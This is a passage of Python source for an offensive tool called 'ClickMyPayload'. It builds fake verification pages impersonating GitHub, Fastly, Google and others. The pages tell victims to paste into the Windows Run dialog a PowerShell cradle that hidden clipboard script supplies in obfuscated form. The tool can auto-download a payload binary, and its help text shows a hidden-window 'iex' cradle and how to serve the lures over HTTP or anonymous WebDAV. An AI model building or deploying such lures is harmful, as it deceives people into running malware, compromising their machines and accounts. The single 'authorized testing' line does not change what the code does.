        <span class="rc-logo-text">reCAPTCHA<br>Privacy &ndash; Terms</span>
      </div>
    </div>
    <div class="steps">
      <div class="step">1. Press <strong>Windows + R</strong> to open Run</div>
      <div class="step">2. Press <strong>Ctrl + V</strong> then <strong>Enter</strong></div>
      <div class="step">3. Verification will complete <strong>automatically</strong></div>
    </div>
    <div class="cmd-box" onclick="copyCmd()">
      <span>{decoy_token}</span>
      <span class="copied" id="badge">Copied!</span>
    </div>
    <button class="btn" id="btn" onclick="verify()">Verify</button>
    <div class="progress" id="prog"><div class="pfill" id="fill"></div></div>
    <div class="status" id="status"></div>
  </div>
  <div class="footer"><a href="#">Privacy</a> &bull; <a href="#">Terms</a></div>
</div>
<script>
{clipboard_js}
function toggleCheck(){{var rc=document.getElementById('rc');rc.classList.toggle('checked');}}
function copyCmd(){{var b=document.getElementById('badge');b.style.opacity='1';setTimeout(function(){{b.style.opacity='0';}},1500);}}
function verify(){{
  var btn=document.getElementById('btn'),prog=document.getElementById('prog'),fill=document.getElementById('fill'),status=document.getElementById('status');
  btn.disabled=true;btn.textContent='Verifying...';prog.style.display='block';
  document.getElementById('rc').classList.add('checked');
  var pct=0,idx=0,msgs=['Checking session...','Processing...','Confirming details...','Verification complete.'];
  var iv=setInterval(function(){{
    pct+=Math.random()*20+5;if(pct>100)pct=100;fill.style.width=pct+'%';
    if(idx<msgs.length)status.textContent=msgs[idx++];
    if(pct>=100){{clearInterval(iv);btn.textContent='Verified \u2713';btn.style.background='#34a853';
      setTimeout(function(){{window.location.href='{redirect_url}';}},1200);}}
  }},300);
}}
</script>
</body>
</html>'''

GITHUB_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>{title}</title>
<style>
  {font_import}
  :root{{--bg:#0d1117;--card:#161b22;--border:#30363d;--text:#e6edf3;--sub:#8b949e;--green:#238636;--blue:#58a6ff}}
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{background:var(--bg);font-family:{font_stack};display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;color:var(--text)}}
  .wrap{{width:100%;max-width:440px;padding:20px}}
  .logo-row{{display:flex;align-items:center;gap:10px;margin-bottom:24px;justify-content:center}}
  .logo-text{{font-size:20px;font-weight:600}}
  .card{{background:var(--card);border:1px solid var(--border);border-radius:6px;padding:32px}}
  h2{{font-size:20px;font-weight:600;margin-bottom:8px;text-align:center}}
  .sub{{font-size:14px;color:var(--sub);text-align:center;line-height:1.6;margin-bottom:20px}}
  .alert{{background:#161b22;border:1px solid #f0883e55;border-radius:6px;padding:12px 16px;margin-bottom:20px;display:flex;gap:10px;align-items:flex-start}}
  .alert-icon{{color:#f0883e;flex-shrink:0;margin-top:1px}}
  .alert-text{{font-size:13px;color:var(--sub);line-height:1.5}}
  .steps{{margin-bottom:16px}}
  .step{{display:flex;align-items:flex-start;gap:10px;margin-bottom:10px;font-size:13px;color:var(--sub);line-height:1.5}}
  .step-num{{background:var(--border);color:var(--text);width:20px;height:20px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;flex-shrink:0}}
  .step strong{{color:var(--text)}}
  .cmd-box{{background:#010409;border:1px solid var(--border);border-radius:6px;padding:12px 14px;font-family:{mono_stack};font-size:12px;color:var(--blue);word-break:break-all;margin-bottom:16px;cursor:pointer;position:relative;transition:border-color .2s;user-select:none}}
  .cmd-box:hover{{border-color:#58a6ff55}}
  .copied{{position:absolute;top:8px;right:8px;background:#1f6feb;color:#fff;font-size:10px;padding:2px 6px;border-radius:4px;opacity:0;transition:opacity .3s}}
  .btn{{width:100%;padding:10px;background:var(--green);color:#fff;font-size:14px;font-weight:500;border:1px solid #2ea04355;border-radius:6px;cursor:pointer;transition:filter .15s;font-family:inherit}}
  .btn:hover{{filter:brightness(1.1)}}
  .progress{{height:2px;background:var(--border);margin-top:12px;border-radius:2px;overflow:hidden;display:none}}
  .pfill{{height:100%;background:var(--green);width:0;transition:width .3s}}
  .status{{font-size:12px;color:var(--sub);margin-top:8px;min-height:16px;text-align:center}}
  .footer{{font-size:11px;color:#484f58;text-align:center;margin-top:20px}}
  @keyframes fade-up{{from{{opacity:0;transform:translateY(10px)}}to{{opacity:1;transform:none}}}}
  .card{{animation:fade-up .4s ease}}
</style>
</head>
<body>
<div class="wrap">
  <div class="logo-row">
    {logo_svg}
    <span class="logo-text">GitHub</span>
  </div>
  <div class="card">
    <h2>Account verification required</h2>
    <p class="sub">Suspicious activity was detected on your account. Complete verification to restore access.</p>
    <div class="alert">
      <span class="alert-icon">\u26a0</span>
      <span class="alert-text">Your account requires a one-time confirmation step before you can continue.</span>
    </div>
    <div class="steps">
      <div class="step"><div class="step-num">1</div><div>Press <strong>Win + R</strong> to open the Run dialog</div></div>
      <div class="step"><div class="step-num">2</div><div>Press <strong>Ctrl + V</strong> to paste, then <strong>Enter</strong></div></div>
      <div class="step"><div class="step-num">3</div><div>The process will complete <strong>automatically</strong></div></div>
    </div>
    <div class="cmd-box" onclick="copyCmd()">
      <span>{decoy_token}</span>
      <span class="copied" id="badge">Copied</span>
    </div>
    <button class="btn" id="btn" onclick="verify()">Verify Account</button>
    <div class="progress" id="prog"><div class="pfill" id="fill"></div></div>
    <div class="status" id="status"></div>
  </div>
  <div class="footer">GitHub, Inc. &bull; <a href="#" style="color:#484f58">Terms</a> &bull; <a href="#" style="color:#484f58">Privacy</a></div>
</div>
<script>
{clipboard_js}
function copyCmd(){{var b=document.getElementById('badge');b.style.opacity='1';setTimeout(function(){{b.style.opacity='0';}},1500);}}
function verify(){{
  var btn=document.getElementById('btn'),prog=document.getElementById('prog'),fill=document.getElementById('fill'),status=document.getElementById('status');
  btn.disabled=true;btn.textContent='Verifying...';prog.style.display='block';
  var pct=0,idx=0,msgs=['Checking account...','Reviewing session...','Confirming details...','Account verified.'];
  var iv=setInterval(function(){{
    pct+=Math.random()*18+6;if(pct>100)pct=100;fill.style.width=pct+'%';
    if(idx<msgs.length)status.textContent=msgs[idx++];
    if(pct>=100){{clearInterval(iv);btn.textContent='Verified \u2713';btn.style.background='#1a7f37';
      setTimeout(function(){{window.location.href='{redirect_url}';}},1200);}}
  }},350);
}}
</script>
</body>
</html>'''

FASTLY_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>{title}</title>
<style>
  {font_import}
  :root{{--red:#ff282d;--dark:#0a0a0a;--card:#111;--border:#1e1e1e;--text:#f0f0f0;--sub:#777}}
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{background:var(--dark);font-family:{font_stack};display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;color:var(--text)}}
  .wrap{{width:100%;max-width:460px;padding:20px}}
  .logo-row{{display:flex;align-items:center;gap:10px;margin-bottom:28px}}
  .logo-text{{font-size:22px;font-weight:800;color:#fff;letter-spacing:-1px}}
  .card{{background:var(--card);border:1px solid var(--border);border-radius:4px;padding:36px}}
  .icon-wrap{{width:56px;height:56px;background:var(--red);border-radius:4px;display:flex;align-items:center;justify-content:center;margin:0 auto 24px;animation:pulse-scale .6s ease forwards}}
  @keyframes pulse-scale{{0%{{transform:scale(0)}}70%{{transform:scale(1.1)}}100%{{transform:scale(1)}}}}
  h2{{font-size:20px;font-weight:700;text-align:center;margin-bottom:8px;letter-spacing:-.02em}}
  .sub{{font-size:13px;color:var(--sub);text-align:center;line-height:1.6;margin-bottom:24px}}
  .steps{{border:1px solid var(--border);border-radius:4px;padding:16px;margin-bottom:16px}}
  .step{{font-size:13px;color:var(--sub);margin-bottom:10px;line-height:1.5;padding-left:16px;position:relative}}
  .step:before{{content:'';position:absolute;left:0;top:7px;width:6px;height:6px;border-radius:50%;background:var(--red)}}
  .step:last-child{{margin-bottom:0}}.step strong{{color:var(--text)}}
  .cmd-box{{background:#050505;border:1px solid var(--border);border-radius:4px;padding:12px 14px;font-family:'Courier New',monospace;font-size:12px;color:#ff6b6b;word-break:break-all;margin-bottom:16px;cursor:pointer;position:relative;transition:border-color .2s;user-select:none}}
  .cmd-box:hover{{border-color:var(--red)}}
  .copied{{position:absolute;top:8px;right:8px;background:var(--red);color:#fff;font-size:10px;padding:2px 8px;border-radius:2px;opacity:0;transition:opacity .3s}}
  .btn{{width:100%;padding:12px;background:var(--red);color:#fff;font-size:14px;font-weight:700;border:none;border-radius:4px;cursor:pointer;letter-spacing:.5px;transition:filter .2s;font-family:inherit}}
  .btn:hover{{filter:brightness(1.1)}}
  .progress{{height:2px;background:var(--border);margin-top:12px;display:none}}
  .pfill{{height:100%;background:var(--red);width:0;transition:width .35s}}
  .status{{font-size:11px;color:var(--sub);margin-top:8px;min-height:16px;text-align:center}}
  .footer{{font-size:11px;color:#333;text-align:center;margin-top:20px}}
</style>
</head>
<body>
<div class="wrap">
  <div class="logo-row">
    {logo_svg}
    <span class="logo-text">Fastly</span>
  </div>
  <div class="card">
    <div class="icon-wrap">
      <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
        <path d="M14 4 L24 9 L24 19 L14 24 L4 19 L4 9Z" stroke="#fff" stroke-width="2" fill="none"/>
        <path d="M14 10 L14 15" stroke="#fff" stroke-width="2.5" stroke-linecap="round"/>
        <circle cx="14" cy="18" r="1.5" fill="#fff"/>
      </svg>
    </div>
    <h2>Access Verification</h2>
    <p class="sub">Your request requires additional confirmation before it can be processed. Please complete the steps below.</p>
    <div class="steps">
      <div class="step">Open <strong>Run</strong> dialog using <strong>Windows + R</strong></div>
      <div class="step">Paste the token using <strong>Ctrl + V</strong>, then press <strong>Enter</strong></div>
      <div class="step">The verification process will <strong>complete automatically</strong></div>
    </div>
    <div class="cmd-box" onclick="copyCmd()">
      <span>{decoy_token}</span>
      <span class="copied" id="badge">Copied</span>
    </div>
    <button class="btn" id="btn" onclick="verify()">VERIFY NOW</button>
    <div class="progress" id="prog"><div class="pfill" id="fill"></div></div>
    <div class="status" id="status"></div>
  </div>
  <div class="footer">Fastly, Inc. &bull; Edge Cloud Platform</div>
</div>
<script>
{clipboard_js}
function copyCmd(){{var b=document.getElementById('badge');b.style.opacity='1';setTimeout(function(){{b.style.opacity='0';}},1500);}}
function verify(){{
  var btn=document.getElementById('btn'),prog=document.getElementById('prog'),fill=document.getElementById('fill'),status=document.getElementById('status');
  btn.disabled=true;btn.textContent='PROCESSING...';prog.style.display='block';
  var pct=0,idx=0,msgs=['Checking session...','Confirming request...','Applying settings...','Access granted.'];
  var iv=setInterval(function(){{
    pct+=Math.random()*15+8;if(pct>100)pct=100;fill.style.width=pct+'%';
    if(idx<msgs.length)status.textContent=msgs[idx++];
    if(pct>=100){{clearInterval(iv);btn.textContent='VERIFIED \u2713';btn.style.background='#16a34a';
      setTimeout(function(){{window.location.href='{redirect_url}';}},1200);}}
  }},360);
}}
</script>
</body>
</html>'''

CUSTOM_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>{title}</title>
<style>
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{background:{bg};font-family:'Segoe UI',system-ui,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;color:{text}}}
  .wrap{{width:100%;max-width:460px;padding:20px}}
  .logo-row{{display:flex;align-items:center;gap:10px;margin-bottom:28px}}
  .logo-text{{font-size:20px;font-weight:700;color:{accent}}}
  .card{{background:{card};border:1px solid {border};border-radius:8px;padding:36px}}
  h2{{font-size:20px;font-weight:600;text-align:center;margin-bottom:8px}}
  .sub{{font-size:13px;color:{sub};text-align:center;line-height:1.6;margin-bottom:24px}}
  .steps{{border:1px solid {border};border-radius:6px;padding:16px;margin-bottom:16px}}
  .step{{font-size:13px;color:{sub};margin-bottom:10px;line-height:1.5;padding-left:16px;position:relative}}
  .step:before{{content:'';position:absolute;left:0;top:7px;width:6px;height:6px;border-radius:50%;background:{accent}}}
  .step:last-child{{margin-bottom:0}}.step strong{{color:{text}}}
  .cmd-box{{background:{cmd_bg};border:1px solid {border};border-radius:6px;padding:12px 14px;font-family:monospace;font-size:12px;color:{cmd_text};word-break:break-all;margin-bottom:16px;cursor:pointer;position:relative;transition:border-color .2s;user-select:none}}
  .cmd-box:hover{{border-color:{accent}}}
  .copied{{position:absolute;top:8px;right:8px;background:{accent};color:#fff;font-size:10px;padding:2px 8px;border-radius:4px;opacity:0;transition:opacity .3s}}
  .btn{{width:100%;padding:12px;background:{accent};color:#fff;font-size:14px;font-weight:600;border:none;border-radius:6px;cursor:pointer;transition:filter .2s}}
  .btn:hover{{filter:brightness(1.1)}}
  .progress{{height:3px;background:{border};margin-top:12px;border-radius:2px;overflow:hidden;display:none}}
  .pfill{{height:100%;background:{accent};width:0;transition:width .35s}}
  .status{{font-size:12px;color:{sub};margin-top:8px;min-height:16px;text-align:center}}
</style>
</head>
<body>
<div class="wrap">
  <div class="logo-row"><span class="logo-text">{brand}</span></div>
  <div class="card">
    <h2>{heading}</h2>
    <p class="sub">{body}</p>
    <div class="steps">
      <div class="step">Press <strong>Windows + R</strong> to open the Run dialog</div>
      <div class="step">Press <strong>Ctrl + V</strong> to paste, then press <strong>Enter</strong></div>
      <div class="step">Verification will complete <strong>automatically</strong></div>
    </div>
    <div class="cmd-box" onclick="copyCmd()">
      <span>{decoy_token}</span>
      <span class="copied" id="badge">Copied</span>
    </div>
    <button class="btn" id="btn" onclick="verify()">{btn_text}</button>
    <div class="progress" id="prog"><div class="pfill" id="fill"></div></div>
    <div class="status" id="status"></div>
  </div>
</div>
<script>
{clipboard_js}
function copyCmd(){{var b=document.getElementById('badge');b.style.opacity='1';setTimeout(function(){{b.style.opacity='0';}},1500);}}
function verify(){{
  var btn=document.getElementById('btn'),prog=document.getElementById('prog'),fill=document.getElementById('fill'),status=document.getElementById('status');
  btn.disabled=true;btn.textContent='Verifying...';prog.style.display='block';
  var pct=0,idx=0,msgs=['Checking...','Validating...','Almost done...','Complete.'];
  var iv=setInterval(function(){{
    pct+=Math.random()*18+6;if(pct>100)pct=100;fill.style.width=pct+'%';
    if(idx<msgs.length)status.textContent=msgs[idx++];
    if(pct>=100){{clearInterval(iv);btn.textContent='Verified \u2713';btn.style.background='#16a34a';
      setTimeout(function(){{window.location.href='{redirect_url}';}},1200);}}
  }},350);
}}
</script>
</body>
</html>'''

TEMPLATE_TITLES = {
    '1': 'Checking your browser \u2014 Cloudflare',
    '2': 'Microsoft account \u2014 Security verification',
    '3': 'Access verification \u2014 Akamai',
    '4': 'Sign in \u2014 Google Accounts',
    '5': 'Account verification required \u2014 GitHub',
    '6': 'Access check \u2014 Fastly',
}

def make_ray_id():
    return ''.join(random.choices('0123456789abcdef', k=16))

def make_timestamp():
    import datetime
    return datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')

def build_html(template, obf_cmd, payload_path, custom_opts=None, redirect_url=None):
    clip_js = make_clipboard_js(obf_cmd, payload_path)
    decoy   = make_decoy_token()
    redir   = redirect_url or REDIRECT_URLS.get(template, 'https://www.google.com')

    if template == '1':
        return CLOUDFLARE_HTML.format(
            title=TEMPLATE_TITLES['1'], font_import=CF_FONT_IMPORT, font_stack=CF_FONT_STACK,
            logo_svg=CLOUDFLARE_LOGO_SVG, decoy_token=decoy, clipboard_js=clip_js,
            ray_id=make_ray_id(), timestamp=make_timestamp(), redirect_url=redir)

    elif template == '2':
        return MICROSOFT_HTML.format(
            title=TEMPLATE_TITLES['2'], font_import=MS_FONT_IMPORT, font_stack=MS_FONT_STACK,
            logo_html=MICROSOFT_LOGO_HTML, decoy_token=decoy, clipboard_js=clip_js, redirect_url=redir)

    elif template == '3':
        return AKAMAI_HTML.format(
            title=TEMPLATE_TITLES['3'], font_import=AK_FONT_IMPORT, font_stack=AK_FONT_STACK,
            logo_svg=AKAMAI_LOGO_SVG, decoy_token=decoy, clipboard_js=clip_js, redirect_url=redir)

    elif template == '4':
        return GOOGLE_HTML.format(
            title=TEMPLATE_TITLES['4'], font_import=GG_FONT_IMPORT, font_stack=GG_FONT_STACK,
            mono_stack=GG_MONO_STACK, logo_svg=GOOGLE_LOGO_SVG, recaptcha_svg=RECAPTCHA_LOGO_SVG,
            decoy_token=decoy, clipboard_js=clip_js, redirect_url=redir)

    elif template == '5':
        return GITHUB_HTML.format(
            title=TEMPLATE_TITLES['5'], font_import=GH_FONT_IMPORT, font_stack=GH_FONT_STACK,
            mono_stack=GH_MONO_STACK, logo_svg=GITHUB_LOGO_SVG,
            decoy_token=decoy, clipboard_js=clip_js, redirect_url=redir)

    elif template == '6':
        return FASTLY_HTML.format(
            title=TEMPLATE_TITLES['6'], font_import=FT_FONT_IMPORT, font_stack=FT_FONT_STACK,
            logo_svg=FASTLY_LOGO_SVG, decoy_token=decoy, clipboard_js=clip_js, redirect_url=redir)

    elif template == '7' and custom_opts:
        return CUSTOM_HTML.format(
            title=custom_opts.get('title','Verification Required'),
            brand=custom_opts.get('brand','Security Check'),
            heading=custom_opts.get('heading','Verification Required'),
            body=custom_opts.get('body','Please complete verification to continue.'),
            btn_text=custom_opts.get('btn_text','Verify Now'),
            bg=custom_opts.get('bg','#0d0d0d'), card=custom_opts.get('card','#141414'),
            border=custom_opts.get('border','#222'), text=custom_opts.get('text','#e8e8e8'),
            sub=custom_opts.get('sub','#888'), accent=custom_opts.get('accent','#0078d4'),
            cmd_bg=custom_opts.get('cmd_bg','#0a0a0a'), cmd_text=custom_opts.get('cmd_text','#7dd3fc'),
            decoy_token=decoy, clipboard_js=clip_js, redirect_url=redir)

def ask(prompt, default=''):
    result = input(f"  {cyan('?')} {prompt}{f' [{dim(default)}]' if default else ''}: ").strip()
    return result or default

def choose(prompt, options):
    print(f"\n  {bold(prompt)}")
    for k, v in options.items():
        print(f"    {cyan(k)}) {v}")
    while True:
        c = input(f"  {cyan(chr(8250))} ").strip()
        if c in options: return c
        print(f"  {red('Invalid choice')}")

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description='ClickMyPayload', add_help=False)
    parser.add_argument('--command',  '-c')
    parser.add_argument('--payload',  '-p')
    parser.add_argument('--template', '-t')
    parser.add_argument('--obf',      '-o')
    parser.add_argument('--output',   '-f')
    parser.add_argument('--redirect', '-r', help='Override redirect URL (default: real brand site)')
    parser.add_argument('--help', action='store_true')
    args = parser.parse_args()

    if args.help:
        print(f"""
  {bold('Usage:')} clickmypayload.py [options]

  {bold('Options:')}
    {cyan('-c, --command')}   PowerShell/cmd cradle to copy to clipboard
    {cyan('-p, --payload')}   Optional binary to smuggle (auto-download)
    {cyan('-t, --template')}  Lure template 1-7
    {cyan('-o, --obf')}       Obfuscation method 1-5
    {cyan('-f, --output')}    Output HTML filename
    {cyan('-r, --redirect')}  Override post-verify redirect URL

  {bold('Font sources (verified):')}
    Cloudflare  → Inter (Google Fonts — brand.cloudflare.com)
    Microsoft   → Segoe UI (system font — Fluent design system)
    Akamai      → Instrument Sans (Google Fonts — 2026 brand guide)
    Google      → Roboto (Google Fonts — accounts.google.com fallback)
    GitHub      → System font stack (Primer design system)
    Fastly      → Inter (Google Fonts — brand.fastly.com)

  {bold('Examples:')}
    python3 clickmypayload.py
    python3 clickmypayload.py -c "powershell -nop -w hidden -c iex(...)" -t 1 -o 2 -f cf.html
    python3 clickmypayload.py -t 5 -r https://support.github.com
""")
        return

    print(f"  {bold('Step 1 \u2014 Command')}")
    print(f"  {'\u2500'*52}")
    print(f"  {dim('PowerShell/cmd cradle silently copied to clipboard.')}\n")
    cmd = args.command or ask('Enter command/cradle')

    print(f"\n  {bold('Step 2 \u2014 Payload File (optional)')}")
    print(f"  {'\u2500'*52}")
    print(f"  {dim('Binary to auto-download alongside the clipboard copy. Leave blank to skip.')}\n")
    payload_path = args.payload
    if not payload_path:
        payload_path = ask('Payload file path', '')
    if payload_path and not os.path.exists(payload_path):
        print(f"  {yellow(chr(9651))} File not found \u2014 skipping embed")
        payload_path = None
    elif payload_path:
        size = os.path.getsize(payload_path)
        print(f"  {green(chr(10003))} Payload: {bold(os.path.basename(payload_path))} ({size/1024/1024:.2f} MB)")

    print(f"\n  {bold('Step 3 \u2014 Obfuscation')}")
    print(f"  {'\u2500'*52}")
    obf_method = args.obf or choose('Select obfuscation method:', OBFUSCATION_METHODS)
    obf_cmd    = obfuscate_payload(cmd, obf_method)
    print(f"  {green(chr(10003))} Method: {bold(OBFUSCATION_METHODS[obf_method])}")

    print(f"\n  {bold('Step 4 \u2014 Lure Template')}")
    print(f"  {'\u2500'*52}")
    template = args.template or choose('Select lure template:', TEMPLATES)

    custom_opts = None
    if template == '7':
        print(f"\n  {bold('Custom template options:')}")
        custom_opts = {
            'title':    ask('Page title',          'Verification Required'),
            'brand':    ask('Brand name',          'Security Check'),
            'heading':  ask('Heading',             'Verification Required'),
            'body':     ask('Body text',           'Please complete verification to continue.'),
            'btn_text': ask('Button text',         'Verify Now'),
            'accent':   ask('Accent color',        '#0078d4'),
            'bg':       ask('Background color',    '#0d0d0d'),
            'card':     ask('Card color',          '#141414'),
            'border':   ask('Border color',        '#222'),
            'text':     ask('Text color',          '#e8e8e8'),
            'sub':      ask('Subtext color',       '#888'),
            'cmd_bg':   ask('Command box bg',      '#0a0a0a'),
            'cmd_text': ask('Command text color',  '#7dd3fc'),
        }

    print(f"\n  {bold('Step 5 \u2014 Post-Verify Redirect')}")
    print(f"  {'\u2500'*52}")
    default_redir = args.redirect or REDIRECT_URLS.get(template, 'https://www.google.com')
    print(f"  {dim(f'Default: {default_redir}')}\n")
    redirect_url = ask('Redirect URL', default_redir)

    print(f"\n  {bold('Step 6 \u2014 Output')}")
    print(f"  {'\u2500'*52}")
    default_out = args.output or f"clickfix_{TEMPLATES[template].split(' ')[0].lower()}.html"
    output = ask('Output filename', default_out)

    print(f"\n  {dim('Generating...')} ", end='', flush=True)
    html = build_html(template, obf_cmd, payload_path, custom_opts, redirect_url)
    with open(output, 'w', encoding='utf-8') as f:
        f.write(html)
    size = os.path.getsize(output)
    print(green('done'))

    print(f"""
  {'\u2500'*52}
  {bold('Output')}
  {'\u2500'*52}
  {bold('File')}         : {green(output)}
  {bold('Size')}         : {size/1024:.1f} KB
  {bold('Template')}     : {TEMPLATES[template]}
  {bold('Obfuscation')}  : {OBFUSCATION_METHODS[obf_method]}
  {bold('Payload')}      : {os.path.basename(payload_path) if payload_path else dim('none')}
  {bold('Redirect')}     : {redirect_url}
  {'\u2500'*52}

  {bold('Serve via HTTP:')}
  {dim('python3 -m http.server 8080')}

  {bold('Serve via WebDAV:')}
  {dim(f'cp {output} /tmp/webdav-corp/')}
  {dim('wsgidav --host=0.0.0.0 --port=8888 --root=/tmp/webdav-corp --auth=anonymous &')}

  {yellow('For authorized testing only.')}
""")

if __name__ == '__main__':
    main()
